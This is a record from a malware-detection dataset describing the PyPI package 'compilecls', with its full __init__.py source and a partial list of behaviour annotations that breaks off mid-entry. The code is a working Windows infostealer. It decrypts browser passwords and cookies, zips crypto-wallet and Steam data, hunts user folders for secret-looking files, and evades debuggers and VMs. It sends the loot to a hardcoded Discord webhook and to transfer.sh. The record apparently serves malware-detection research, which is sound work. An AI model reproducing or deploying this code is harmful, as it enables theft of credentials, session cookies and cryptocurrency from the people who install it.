{
  "metadata": {
    "package_name": "compilecls-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/compilecls-1.0.2-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/compilecls-1.0.2-py3-none-any/compilecls/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nNotPSSW = []\n\n__config__ = {\n    \"yourwebhookurl\": \"https://discordapp.com/api/webhooks/1094671563900592279/_cSChOjEJs9TL7F1Kugq6WvyOKIKN1_qV3kRqXOeZ_F-OaXj7X7HFj86zihjv1RInLqJ\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    \"hide\": \"yes\",\n    \"ping\": \"yes\",\n    \"pingtype\": \"everyone\",\n    \"fake_error\": \"no\",\n    \"startup\": \"no\",\n    \"kill_discord_process\": \"%kill_discord_process%\",\n    \"dbugkiller\": \"%_debugkiller%\",\n    \"addresse_crypto_replacer\": \"no\",\n    \"addresse_btc\": \"none\",\n    \"addresse_eth\": \"none\",\n    \"addresse_xchain\": \"none\",\n    \"addresse_pchain\": \"none\",\n    \"addresse_cchain\": \"none\",\n    \"addresse_monero\": \"none\",\n    \"addresse_ada\": \"none\",\n    \"addresse_dash\": \"none\",\n    \"blprggg\": [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\",\n    ],\n}\n\nlogin_info = os.getlogin()\ncomputer_victim = os.getenv(\"COMPUTERNAME\")\nfast_memory_storage = str(psutil.virtual_memory()[0] / 1024**3).split(\".\")[0]\nstorage_space = str(psutil.disk_usage(\"/\")[0] / 1024**3).split(\".\")[0]\n\nbc_myregex_secret = \"https://paste.bingner.com/paste/u7qoj/raw\"\nreg_req = requests.get(bc_myregex_secret)\nregx_net = r\"[\\w-]{24}\\.\" + reg_req.text\n\n# ...\n# (Omitted: The full class definitions for Functions, auto_copy_wallet, first_function_bc, NoDebugg)\n# ...\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef find_in_config(e: str) -> str or bool | None:\n    return __config__.get(e)\n\nhook = find_in_config(\"yourwebhookurl\")\n\nclass DATA_BLOB(Structure):\n    _fields_ = [(\"cbData\", wintypes.DWORD), (\"pbData\", POINTER(c_char))]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b\"\"):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(\n        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)\n    ):\n        return GetData(blob_out)\n\ndef Value_Dcryptage(buff, master_key=None):\n    starts = buff.decode(encoding=\"utf8\", errors=\"ignore\")[:3]\n    if starts == \"v10\" or starts == \"v11\":\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\ndef Requests_loading(methode, url, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if methode == \"POST\":\n                if data != \"\":\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != \"\":\n                    r = requests.post(url, files=files)\n                    if (\n                        r.status_code == 200 or r.status_code == 413\n                    ):  # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\n\ndef URL_librairy_Loading(hook, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if headers != \"\":\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\", listt)\n    while \"https\" in e:\n        e.remove(\"https\")\n    while \"com\" in e:\n        e.remove(\"com\")\n    while \"net\" in e:\n        e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, tk=\"\"):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n    }\n\n    if name == \"check_spec_bc\":\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [\n                        {\"name\": \"Interesting files found on user PC:\", \"value\": tk}\n                    ],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\"text\": \"github.com/KSCHdsc\"},\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {\"file\": open(path, \"rb\")}\n\n    if \"bc_allpasswords\" in name:\n        ra = \" | \".join(da for da in paswWords)\n\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = \" | \".join(da for da in rrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Passwords Found:\", \"value\": ra}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = \" | \".join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = \" | \".join(da for da in rrrrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Cookies Found:\", \"value\": rb}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    Requests_loading(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode=\"w\", encoding=\"utf-8\") as f:\n        f.write(f\"Created by KSCH | https://github.com/KSCHdsc\\n\\n\")\n        for line in data:\n            if line[0] != \"\":\n                f.write(f\"{line}\\n\")\n\nNotPSSW = []\n\ndef Find_Passw(path, arg):\n    global NotPSSW\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in paswWords:\n                        paswWords.append(old)\n            NotPSSW.append(\n                f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {Value_Dcryptage(row[2], master_key)}\\n\\n\"\n            )\n    writeforfile(NotPSSW, \"bc_allpasswords\")\n\nCookies = []\n\ndef Get_Bc_Cook(path, arg):\n    global Cookies\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in cookiWords:\n                        cookiWords.append(old)\n            Cookies.append(\n                f\"{row[0]}\\tTRUE\"\n                + \"\\t\\t\"\n                + f\"/FALSE\\t2597573456\\t{row[1]}\\t{Value_Dcryptage(row[2], master_key)}\"\n            )\n    writeforfile(Cookies, \"bc_allcookies\")\n\ndef checkIfProcessRunning(processName):\n    \"\"\"\n    Check if there is any running process that contains the given name processName.\n    \"\"\"\n    # Iterate over the all the running process\n    for proc in psutil.process_iter():\n        try:\n            # Check if process name contains the given name string.\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False\n\ndef ZipMyThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC):\n        return\n    if checkIfProcessRunning(\"chrome.exe\"):\n        print(\"Yes a chrome process was running\")\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    else:\n        ...\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):\n            return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False:\n            return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    print(zf)\n    for file in os.listdir(pathC):\n        if not \".zip\" in file:\n            zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    upload(f\"{pathC}/{name}.zip\")\n    os.remove(f\"{pathC}/{name}.zip\")\n\ndef bc_Gather_All():\n    \"Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >\"\n    browserPaths = [\n        [\n            f\"{roaming}/Opera Software/Opera GX Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome SxS/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/BraveSoftware/Brave-Browser/User Data\",\n            \"brave.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Yandex/YandexBrowser/User Data\",\n            \"yandex.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Microsoft/Edge/User Data\",\n            \"edge.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n    ]\n\n    Paths_zipped = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n        [\n            f\"{roaming}/NationsGlory/Local Storage/leveldb\",\n            \"NationsGlory.exe\",\n            \"NationsGlory\",\n        ],\n    ]\n\n    for patt in browserPaths:\n        a = threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=Get_Bc_Cook, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies:\n        thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True:\n        return\n    for patt in browserPaths:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef CreateFolder_(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file):\n            return\n        i += 1\n        if i <= maxfilesperdir:\n            url = UploadTo_Anon(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\nbc_create_files = []\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append(\n                        [path + \"/\" + file, UploadTo_Anon(path + \"/\" + file)]\n                    )\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    CreateFolder_(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"seecret\",\n    ]\n\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(\n            target=bc_create_file, args=[patt, key_wordsFiles]\n        )\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\n\nkeyword = [\n    \"mail\",\n    \"[coinbase](https://coinbase.com)\",\n    \"[sellix](https://sellix.io)\",\n    \"[gmail](https://gmail.com)\",\n    \"[steam](https://steam.com)\",\n    \"[discord](https://discord.com)\",\n    \"[riotgames](https://riotgames.com)\",\n    \"[youtube](https://youtube.com)\",\n    \"[instagram](https://instagram.com)\",\n    \"[tiktok](https://tiktok.com)\",\n    \"[twitter](https://twitter.com)\",\n    \"[facebook](https://facebook.com)\",\n    \"card\",\n    \"[epicgames](https://epicgames.com)\",\n    \"[spotify](https://spotify.com)\",\n    \"[yahoo](https://yahoo.com)\",\n    \"[roblox](https://roblox.com)\",\n    \"[twitch](https://twitch.com)\",\n    \"[minecraft](https://minecraft.net)\",\n    \"bank\",\n    \"[paypal](https://paypal.com)\",\n    \"[origin](https://origin.com)\",\n    \"[amazon](https://amazon.com)\",\n    \"[ebay](https://ebay.com)\",\n    \"[aliexpress](https://aliexpress.com)\",\n    \"[playstation](https://playstation.com)\",\n    \"[hbo](https://hbo.com)\",\n    \"[xbox](https://xbox.com)\",\n    \"buy\",\n    \"sell\",\n    \"[binance](https://binance.com)\",\n    \"[hotmail](https://hotmail.com)\",\n    \"[outlook](https://outlook.com)\",\n    \"[crunchyroll](https://crunchyroll.com)\",\n    \"[telegram](https://telegram.com)\",\n    \"[pornhub](https://pornhub.com)\",\n    \"[disney](https://disney.com)\",\n    \"[expressvpn](https://expressvpn.com)\",\n    \"crypto\",\n    \"[uber](https://uber.com)\",\n    \"[netflix](https://netflix.com)\",\n]\n\ncookiWords = []\npaswWords = []\n\nbc_Gather_All()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = check_spec_bc()\n\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"LOCALAPPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"COMPUTERNAME\"",
              "object_description": "Environment variable for Windows hostname",
              "object_id": "windows_hostname_env_var",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "psutil.virtual_memory()",
              "action_description": "Retrieves system virtual memory statistics",
              "action_id": "get_virtual_memory",
              "object": "",
              "object_description": "System info",
              "object_id": "system_info",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "psutil.disk_usage()",
              "action_description": "Retrieves disk usage statistics (total, used, free) for given path",
              "action_id": "get_disk_usage",
              "object": "\"/\"",
              "object_description": "Mount point directory",
              "object_id": "mount_point_directory",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "bc_myregex_secret",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "\".google.com\", data",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "\"(\\w+[a-z])\", listt",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "url, data=data",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "url, files=files",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(hook, data=data, headers=headers)",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "Request(hook, data=data)",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"rb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "hook, files=files",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, mode=\"w\", encoding=\"utf-8\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.stat()",
              "action_description": "Retrieves file status",
              "action_id": "path_object_operations",
              "object": "pathC",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "pathC, tempfold",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "tempfold",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT action_url, username_value, password_value FROM logins;\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tempfold",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
